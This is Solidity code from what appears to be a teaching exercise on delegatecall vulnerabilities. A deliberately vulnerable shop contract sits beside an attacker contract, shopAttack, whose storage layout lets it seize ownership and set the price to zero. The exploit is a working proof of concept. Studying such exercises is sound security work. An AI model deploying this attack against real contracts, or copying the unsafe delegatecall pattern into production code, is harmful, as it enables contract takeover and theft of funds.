pragma solidity ^0.5.0;
import "SecLessonPoc-main/contracts/delegatecall/check/shop.sol";
contract shopAttack{
    address public _goods;
    address public owner;
    uint256 public prize;
    uint256 public score;
    check che;
    constructor(address _che)public{
        che  = check(_che);
    }
    //调用两次attack和一次complete即可
    function setPrize(uint256 amount)public {
        prize = 0;
        owner = msg.sender;
        
    }

    function attack()public{
        che.changePrice(uint160(address(this)));
    }
    function complete()public{
        che.isCompleted();
    }
}

/// @knowledgePoint delegatecall
 
/// @level 简单
/// @description 1.成为owner。2.商品价格修改为0。
pragma solidity ^0.5.0;
contract shop{
    goods public _goods;
    address public owner = address(this);
    uint256 public prize;
    uint256 public score;
    constructor()public{
        _goods = new goods("food",1000000 ether);
        prize = 1000000 ether;
    }
    function changePrice(uint256 amount)public{
      (bool success,) = address(_goods).delegatecall(abi.encodeWithSignature("setPrize(uint256)",amount));
       require(success,"delegatecall failed");
       require(score==0);
    }
}

contract goods{
    uint256 public prize;
    string public name;
    constructor(string memory _name,uint256 _prize)public{
        name = _name;
        prize = _prize;
    }
    function setPrize(uint256 amount)public {
        prize = amount;
    }
}

contract check is shop{
    function isCompleted()external{
        score=0;
        if(owner==msg.sender){
            score+=50;
        }
        if(prize==0){
            score+=50;
        }
    }
}

